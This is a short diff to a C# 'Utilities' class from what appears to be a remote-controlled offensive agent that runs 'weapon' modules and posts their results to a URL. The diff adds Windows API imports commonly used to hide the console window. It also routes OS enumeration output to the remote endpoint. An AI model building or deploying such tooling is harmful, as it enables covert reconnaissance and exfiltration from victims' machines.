@@ -3,6 +3,7 @@ using System.IO;
 using System.Net;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Runtime.InteropServices;
 
 class Utilities
 {
@@ -21,6 +22,12 @@ class Utilities
             "   weapon                  Use a weapon module\n";
 
     }
+
+    [DllImport("kernel32.dll")]
+    static extern public IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern public bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
     // File to byte[]
     private static byte[] FileToByte(string location, string filename)
@@ -75,7 +82,7 @@ class Utilities
         
         switch (weapon.ToLower()) {
             case "basicenum":
-                Weapons.ListBasicOSInfo();   
+                Weapons.ListBasicOSInfo(url);   
                 break;
             default:
                 Post(url, "#!#Weapon does not exist");
